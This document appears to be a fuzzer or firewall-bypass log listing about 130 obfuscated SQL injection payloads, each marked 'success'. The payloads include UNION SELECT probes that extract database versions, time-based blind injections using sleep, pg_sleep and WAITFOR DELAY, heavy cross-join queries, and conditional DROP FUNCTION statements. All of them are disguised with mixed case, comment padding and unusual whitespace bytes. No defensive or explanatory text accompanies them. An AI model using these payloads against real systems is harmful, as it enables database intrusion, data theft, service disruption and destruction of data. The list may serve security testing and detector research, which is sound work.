7 success "1' where 'V'='V' OR/**/0 "
15 success "1%' and/**/438 NOT LIKE 439 OR 'Z'='Z1'\n"
16 success '-9031%"  )   order/**/by 0x1-- '
19 success "0x1'+  (  select dpkp where\t4836  =  (SELECT 4836)\tand sleep  (  0x5   )    )   +' "
24 success '-2378" WhEre 2686  = /**/2686 || 4717 LIKE 4717-- '
29 success 'eNd and    (    (   0x870  =  (SELECt 0x870) '
30 success "-(SELECT 6220)' union all select 0x5b6,0x5b6# "
36 success '0x1" whEre \'VBd\' NOT LIKE \'VBd%\' '
39 success '1  )   union\x0ball SElecT null,null,null,null,null,null-- '
42 success "1'||  (  select 'svnn' frOM dual wHERe\x0c0x759 not like 1882 "
45 success "0x1   )    )\n   as wajy/**/where '43' LIKE '43' "
50 success "-0x250c' or   (  0x1bd9  =  2349  ) \n*2349 and 'fcsa' like 'fcsa "
64 success '1%" and elt  (  0x14e1  =  8751,8751  )   and "%"  = \x0c" '
66 success '-9737"   )    )     )  /**/order by/**/1-- '
69 success '0x1  )   AnD elt  ( /**/7425  =  8842,8842  )   &&   (  9194  =  9194 '
71 success ' select * FroM users WHeRE id  =  1 oR 1#"? union selECT null,version  (    )   -- (SELECT 1) '
85 success ' SeLEct * frOm users wHERe id  =  (SeLeCt 1) OR 1#"1 union SElEct \'a\',version  (    )   -- 0x1 '
102 success "1' where 5781 LIKE 5781 "
103 success '1" whEre \'Zz\' NOT LIKE \'Zz8\' '
114 success "0x1' wHere 0x146e   like \t\x0c5230/**/"
118 success "SELEct count  (  *  )   fROm sysibm.systables As t1,sysibm.systables aS t2,sysibm.systables aS t3 anD    (    (     (  'vcgc' LikE 'vcgc "
122 success "1'\xa0 )   where 4418 LIKE 0x1142 OR 1605 NOT LIKE\n1605 "
124 success '1" && elt \xa0(  6093=6093,0x1c5b  )   '
141 success '(SELeCt 1)%"  ) \x0c aNd 0x1f58   LIke   0xde8-- xd'
147 success '0x1"  )   as fgne where\n\'j\' NOT LIKE \'jN\' '
154 success '0x1" WHere 0x1ec7 \x0b LIKE   7879/**/'
165 success "1'  )   where 3476  =  3476 and elt  (  ')' LIKE ')',sleep  (  5   )    )  \x0b-- "
166 success "1'|| \t(  select 'ymre'\xa0where 'X'='X' "
181 success "(SeLect 1)  )   OR elt  (  'z'='z' AND 1,sleep  (  5   )    )    AND   (  0x2198  =  8600 "
212 success "(SELECT 1)'+  (  SeLeCT yjyp WHERE 0x25e0   liKE  /**/9696 && 1 "
222 success "1' whErE 'K' NOT LIKE 'KP'\n"
226 success "1' In boolean mode\x0c )   && 5725  =  0x15b0# "
228 success "1' where (SELECT/**/4945)  =  0x1351 "
246 success "SelECT sleep  (  5  )   &&    ( \x0c  (   'z'='z' "
258 success '(SELECT 1)"  )   as jqli where \'-tu\'=\'-tu\' '
265 success "(SELECT 1)'+  (  select somn where 0x21bc  =  0x21bc rlike sleep  (  0x5   )    )   +' "
288 success '(SELECT 1)%" and 0x1d6d  =  0x1d6d and "%"  = \x0b" '
302 success "1'||  ( \xa0select 'xugb'/**/from dual where '\n' NOT LIKE '\nR' "
318 success "1'+  (  seleCt\x0cgqez WHERE '('='(' "
322 success 'iF  (  3392  =  4422 \n) \t sELEct 3392 elsE DRoP function xsqq-- '
353 success '0x1"   )    )    oR 0x1fdc  =    (  SElEcT count  (\n *  )   FrOm generate_series  (  0x1,0x4c4b40   )    )   -- zb'
360 success "1' In boolean mode  )   AND (seleCT 4027)=4027-- "
388 success '-4494 or (SELECT 5291)   like  /**/4452 '
391 success "0x1'||  (  select 'lljg' fROM dual where/**/0x1dcf  =  0x1dcf "
409 success 'iif  (  1157\t  LIKE   4542,1,1/0x0  )   '
433 success '-2448%"  )   ||/**/3038\t =  (SELECT 0xbde) '
438 success "1'  )   aS chla wHeRE 6098/**/  like   0x17d2\x0c"
443 success '0x1   )    )    oR\x0b0x207b  =    (  sElEct count  (  *  )   fRoM sysibm.systables aS t1,sysibm.systables as t2,sysibm.systables AS t3  )   ANd    (    (   (SELECT 9914)  =  9914 '
444 success "1'/**/ )   and 'L' NOT LIKE 'Ly' "
448 success '1 where 9825 NOT\tLIKE 9826 union all select null,null,null,null# '
457 success '0x1"  )   as ebvt where \'ychm\' LIKE \'ychm\' '
459 success '-0x268f"  )  \xa0union all SELEct 0x237a# \t-'
479 success '1"  )   as nyzd WHErE 601 NOT LIKE 602 '
484 success "-9672'   )    )    aS rupb WherE 8218 \x0c=  8218 anD True  OR  make_set  (  0x135a  =  1836,1836  )  -- n"
487 success "0x1%'  )   and elt  (  3015=3015 OR False AND 4247=(SELECT 4247) AND 1,sleep  ( \xa05   )    )   # "
493 success "1'||  (  select 'bzxa' where 4988 IN (4987,4988,4989) OR False OR 3238=3239 "
494 success '0x1" WhErE 7110 \xa0=  0x1bc6 AND True '
513 success '-2211" or 2113  =  0x22b5# '
516 success "waitfor delay '(SELECT 0x0):0x0:5' anD '%'   likE \xa0 ' "
524 success '-8245"   )    )     OR  \'P\' LIKE \'P\' '
535 success "1'|| \n(  select 'kptj' from dual where 'R' NOT LIKE 'RT' OR 0 "
541 success "1  )   WhERE 'I<Y'='I<Y'/**/"
552 success '1"  )   as xioc wHEre 7260  =  7260 or elt  (  4947=4947,sleep  (  5   )    )   # '
566 success '1" where \'BhefL\'=\'BhefL\' AND True '
573 success '-9496   )    )     )   oR elt\x0c (  0x1d57   lIke   3951,3951  )   And    (    (     (  3514  =  3514 '
574 success "-4775'  )   || 3038/**/ =\t 0xbde AND True "
575 success 'IF  (  4735  =  8907  )   Select 4735 ELSE dROp/**/function qigo-- fR3='
577 success "1' WHERE\x0c1628  = \x0c0x65c AND True "
594 success "-0x19a7'   )    )    union all seLEct 0xc91#\t"
616 success '1 union/**/all select null,null,null,null,null,null# '
619 success "1'   )    )    as icik where 1440   LIKE   1440 OR '{.4' LIKE '{.43' aND 0x1ffd  =    (  SELect count  (  *  )   froM sysibm.systables aS t1,sysibm.systables As t2,sysibm.systables As t3  )  -- "
625 success "0x1'  )   and 0x1b39  =    (  select 0x1b39 from pg_sleep  (  0x5   )    )    and   (  'ayol'  =  'ayol\x0b"
646 success 'IF  (  8284  =  6171  )   sELECT 8284 ELse dRop function mbih-- '
654 success '1" WHeRE \'B\' NOT LIKE \'BH\' '
658 success "0x1' wherE/**/3700   LiKe   (SEleCt 0xe74) union\tall sElEct null,null,null-- "
665 success "1  ) /**/ as odqn\nwhere 'V' LIKE 'V' "
668 success "-0xa62  )   aS casi WHERe '\\' LIKE '\\' or 0x2035  =  (sELECt 9651)-- "
685 success "0x1%'  )   and\x0c  (  'eqn[`' LIKE 'eqn[`'  )  *(SELECT 0x1a2f) and   (  '%'  =  ' "
698 success '(SELECT 1)"   )    )    AS eglv whERe \'\\\'=\'\\\' union all sELeCt null# '
706 success "1'  )   As ohcs wHere (SELECT 9588)   lIke   9588 or/**/elt  (  '`' LIKE '`' OR 1855=1856,sleep  (  0x5   )    )   -- "
712 success "1'  )   AS syer WHERE 3141  =  3141 rlike   (  sELECT   (  CasE when   (  6233  =  7567  )   tHen 1 Else 0x28 enD   )    )   -- "
722 success "1'+  (  SeLEcT nash WheRE (SeLeCT (SElEcT 0x103f))  =  0x103f union all sElecT null# "
726 success "1' where 'V' LIKE\n'V' "
738 success '(SELECT 28)% '
741 success '1 WherE 364!=365 '
754 success "-2120'  )   or 8734/**//**/=  8844# "
764 success "1  )   AS ghew WHERe/**/0x1929   likE  \x0c0x1929 OR 'g9'='g9{' union all sELEcT null,null-- B"
766 success '1   )    )    || 0x1fdc  =    (  SeLECt count  (  *  )  \x0bfROM generate_series  (  1,5000000   )    )   -- 0x9'
777 success "0x1  )   WHere 'N\x0c' NOT LIKE 'N\x0ch'/**/"
782 success "waitfor delay '0:0x0:5' And  \x0b(  4614   lIkE \x0c 4614 AND True "
802 success '1 where 2301\n =  0x8fd '
808 success '0x1  )   and make_set  (  0x20d3  =  8403,0x22c3 \t)   '
818 success '0x1 And elt  (  0x4ba   like   0x4ba,sleep  (  0x5   )    )   # macc '
822 success 'iif  (  4460   LIKE   1610,1,1/0x0  )   '
847 success '1"   )    )     )  \x0bor 0x1cf9   LiKE     (  SELEct count  (  *  )   FroM sysibm.systables AS t1,sysibm.systables As t2,sysibm.systables aS t3  )  -- '
860 success "1'+  (  SELECt eluw wherE 0x1842 \x0c like   0x1842 "
863 success ' sELEcT * fRoM users WhEre id  =  1 *\\./**/union seLEct null,@@VERSION -- 1 YK'
897 success ' seLecT * FROM users WHERe id  =  1 +\\./**/union sElECt null,@@VERSION -- 1 '
901 success "1'+  (  select 'xqjx' WherE 7048  =  7048 OR 5554 NOT LIKE 5554 oR False aND 9198   LikE   9198-- "
912 success '-0xa08"  )   or   (  0x210b  =  0x210b  )  *0x132a and   (  "exyw"  =  "exyw '
929 success "1'||  (  select 'ymez' fROm dual wheRe 0x268e  =  0x268e Or 0x1cf9   LIKE     (  seLeCT count  (  *  )   froM sysibm.systables AS t1,sysibm.systables aS t2,sysibm.systables aS t3  )  -- "
932 success '1 Where 2382\t = \n2382/**/'
938 success "1  )  \x0cwhere 'j' NOT LIKE 'j2' "
956 success '1" WheRE\t\'Z\' LIKE \'Z\' '
976 success "1'  )   as dpmh where 'o.w' LIKE 'o.w' aND 9204 LIKE 9204 "
992 success "-2869'\n  )    )    union all select 0xc90-- "
995 success "1'  )   where '\\X4' NOT LIKE '\\X4y' OR 'XJ'='XJv' "
1000 success '1 wHERe\x0c5592/**/iN/**/(5591,0x15d8,0x15d9) '
1002 success "-3107'  )   where 7782  =  7782 OR 8571   like   0x217b--\x0c"
1003 success '1"   )    )\t   aS jrld/**/wHERe (SELECT/**/3488)   LIKE   0xda0 '
1012 success 'iF  (  8995   LIKE   9787  )   SELECt 8995 eLSE dRoP function ofgg-- '
1018 success "-0x669'\nunion all SELecT/**/4835# "
1038 success "1'  )   && '+' LIKE '+' "
1047 success "1  )   WHERe '{' NOT LIKE '{C' "
1066 success "1'\x0b  )    )   \nunion all select null,null,null,null,null-- "
1068 success '(SELECT 1)" where \'$\'=\'$\' '
1069 success '-5147 OR   (  5790=5790  ) \x0b*4906 '
1070 success '-3707"  \n)    )     )   or \'S\' NOT LIKE \'SO\'-- '
1078 success '1\n )   whERe 4780   LikE  /**/4780 '
1117 success '-5963" Or 241 NOT LIKE 242 OR 0# 6P'
1123 success "-1602' OR 3038  =  3038/**/"
1133 success '1"  )   WhEre 0x14ee  =\x0c 0x14ee '
1143 success 'iif  (  1217   LIKE   8831,1,(SELECT 1)/0  )   '
